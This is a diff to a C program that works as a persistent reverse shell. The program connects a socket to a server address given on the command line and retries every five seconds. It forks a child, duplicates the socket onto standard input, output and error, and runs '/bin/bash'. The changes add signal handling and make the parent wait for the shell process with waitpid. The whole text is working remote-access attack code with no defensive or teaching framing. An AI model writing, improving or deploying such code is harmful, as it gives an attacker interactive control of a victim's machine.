@@ -9,6 +9,7 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <wait.h>
 #define SHELL "/bin/bash"
 #define MAX_BUF 1024
 
@@ -81,6 +82,8 @@ int main(int argc, char* argv[])
 
     char buffer[MAX_BUF];
     int sockfd = create_socket();
+    int status;
+    void (*osighand)(int);
     bool conn_flag = false;
     struct sockaddr_in serv_addr = create_serv_addr(argv);
 infinite_loop:
@@ -88,7 +91,9 @@ infinite_loop:
     if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) >= 0) {
         conn_flag = true;
         memset(&buffer, 0, MAX_BUF);
+        osighand = signal(SIGCHLD, SIG_DFL);
         if ((pid = fork()) == 0) {
+            signal(SIGPIPE, SIG_DFL);
             for (int i = 0; i < 3; i++) {
                 close(i);
                 dup2(sockfd, i);
@@ -101,12 +106,10 @@ infinite_loop:
         sleep(5);
     }
     if (conn_flag) {
-        while (recv(sockfd, buffer, sizeof(buffer), MSG_PEEK | MSG_DONTWAIT)
-            != 0) {
-            sleep(5);
-            if (strncmp(buffer, "exit\n", 6) == 0)
-                break;
+        while (waitpid(pid, &status, 0) == -1) {
         }
+
+        signal(SIGCHLD, osighand);
 
         kill(pid, SIGKILL);
 
